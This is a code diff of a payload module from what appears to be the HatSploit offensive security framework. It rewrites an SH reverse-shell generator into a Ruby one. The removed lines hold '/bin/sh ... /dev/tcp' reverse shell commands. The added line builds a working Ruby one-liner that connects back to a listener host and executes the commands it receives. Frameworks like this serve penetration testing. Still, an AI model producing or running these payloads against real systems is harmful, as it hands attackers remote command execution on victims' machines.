@@ -24,27 +24,27 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import HatSploitPayload
+from core.lib.payload import Payload
+from utils.tcp.tcp import TCPClient
 
-from utils.tcp.tcp import tcp
 
-class HatSploitPayload(HatSploitPayload):
-    tcp = tcp()
-
+class HatSploitPayload(Payload, TCPClient):
     details = {
-        'Name': "SH Shell Reverse TCP",
-        'Payload': "multi/generic/sh_reverse_tcp",
+        'Category': "single",
+        'Name': "Ruby Shell Reverse TCP",
+        'Payload': "unix/generic/ruby_reverse_tcp",
         'Authors': [
             'enty8080'
         ],
-        'Description': "SH shell reverse TCP payload.",
+        'Description': "Ruby shell reverse TCP payload.",
         'Dependencies': [
             ''
         ],
         'Comments': [
             ''
         ],
-        "Platform": "multi",
+        'Architecture': "generic",
+        'Platform': "unix",
         'Risk': "high",
         'Type': "reverse_tcp"
     }
@@ -52,7 +52,7 @@ class HatSploitPayload(HatSploitPayload):
     options = {
         'LHOST': {
             'Description': "Local host.",
-            'Value': tcp.get_local_host(),
+            'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
@@ -61,24 +61,14 @@ class HatSploitPayload(HatSploitPayload):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'PROMPT': {
-            'Description': "Show shell prompt.",
-            'Value': "no",
-            'Type': "boolean",
-            'Required': False
         }
     }
 
     def run(self):
-        local_host, local_port, prompt = self.parser.parse_options(self.options)
+        local_host, local_port = self.parse_options(self.options)
 
-        self.badges.output_process("Generating payload...")
-
-        if prompt in ['yes', 'y']:
-            payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
-        else:
-            payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
+        self.output_process("Generating payload...")
+        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + local_host + "\",\"" + local_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
 
         self.payload = payload
         self.instructions = payload
